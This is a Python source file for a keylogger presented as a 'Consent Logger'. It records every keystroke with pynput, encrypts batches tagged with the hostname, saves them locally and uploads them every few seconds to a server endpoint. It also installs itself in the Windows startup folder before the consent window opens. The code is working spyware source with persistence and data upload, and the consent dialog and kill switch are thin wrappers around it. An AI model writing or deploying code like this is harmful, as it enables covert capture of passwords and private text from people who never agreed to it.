import os
import sys
import json
import time
import base64
import socket
import threading
from datetime import datetime
import requests
from pynput import keyboard
import tkinter as tk
from tkinter import scrolledtext

from crypto_utils import encrypt_text  # Make sure you have this file

# === Kill switch & persistence ===
KILL_SWITCH_PATH = os.path.expanduser("~/.logger_kill")

def check_kill_switch():
    if os.path.exists(KILL_SWITCH_PATH):
        print("[!] Kill switch activated. Exiting...")
        sys.exit(0)

def add_to_startup():
    script_path = os.path.abspath(__file__)
    if os.name == "nt":  
        startup_path = os.path.expandvars(
            r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
        )
        dest_path = os.path.join(startup_path, "consent_logger.lnk")
        try:
            import win32com.client
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(dest_path)
            shortcut.Targetpath = sys.executable
            shortcut.Arguments = script_path
            shortcut.WorkingDirectory = os.path.dirname(script_path)
            shortcut.save()
            print("[+] Persistence added (Windows Startup)")
        except Exception as e:
            print("[-] Could not add persistence (Windows):", e)

# === Logging setup ===
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

SERVER_URL = "http://127.0.0.1:5000/upload"

buffer = []
stop_event = threading.Event()

def flush_buffer():
    """
    Encrypt buffer contents, save locally, and POST to server.
    """
    global buffer
    if not buffer:
        return

    text = "".join(buffer)
    buffer = []

    record = {
        "ts": datetime.utcnow().isoformat() + "Z",
        "host": socket.gethostname(),
        "text": text,
    }
    record_json = json.dumps(record, ensure_ascii=False)

    enc_bytes = encrypt_text(record_json)

    # Save locally
    fname = f"log_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt.enc"
    fpath = os.path.join(LOG_DIR, fname)
    with open(fpath, "wb") as f:
        f.write(enc_bytes)

    # Send to server
    payload = {
        "host": record["host"],
        "ts": record["ts"],
        "payload_b64": base64.b64encode(enc_bytes).decode(),
    }

    try:
        r = requests.post(SERVER_URL, json=payload, timeout=3)
        if r.ok:
            print(f"[+] Flushed {fname} to server")
        else:
            print(f"[-] Server rejected: {r.text}")
    except Exception as e:
        print(f"[-] Server unavailable: {e}")

def background_flush():
    while not stop_event.is_set():
        try:
            flush_buffer()
        except Exception as e:
            print(f"[!] Flush error: {e}")
        time.sleep(5)

# === Keylogger with pynput ===
def on_press(key):
    try:
        buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            buffer.append(" ")
        elif key == keyboard.Key.enter:
            buffer.append("\n")
        else:
            buffer.append(f"[{key.name}]")

def on_release(key):
    if key == keyboard.Key.esc:
        print("[!] ESC pressed, stopping keylogger")
        return False

# === Tkinter App for Consent ===
class ConsentLoggerApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Consent Logger")
        self.geometry("400x300")

        self.text_area = scrolledtext.ScrolledText(self, wrap=tk.WORD, width=40, height=10)
        self.text_area.pack(pady=10)

        self.start_btn = tk.Button(self, text="Start Logging", command=self.start_logging)
        self.start_btn.pack(pady=5)

        self.stop_btn = tk.Button(self, text="Stop Logging", command=self.stop_logging, state=tk.DISABLED)
        self.stop_btn.pack(pady=5)

    def start_logging(self):
        self.text_area.insert(tk.END, "[*] User consented. Starting keylogger...\n")
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)

        threading.Thread(target=self.run_keylogger, daemon=True).start()
        threading.Thread(target=background_flush, daemon=True).start()

    def stop_logging(self):
        stop_event.set()
        self.text_area.insert(tk.END, "[!] Logging stopped by user.\n")
        flush_buffer()
        self.stop_btn.config(state=tk.DISABLED)

    def run_keylogger(self):
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

# === Main ===
if __name__ == "__main__":
    check_kill_switch()
    add_to_startup()

    app = ConsentLoggerApp()
    app.mainloop()















# from persistence import check_kill_switch, add_to_startup

# if __name__ == "__main__":
#     check_kill_switch()   # Prevents running if kill-switch file exists
#     add_to_startup()      # Ensures auto-run on startup

#     app = ConsentLoggerApp()
#     app.mainloop()

# from pynput import keyboard

# def on_press(key):
#     try:
#         buffer.append(key.char)
#     except AttributeError:
#         buffer.append(str(key))
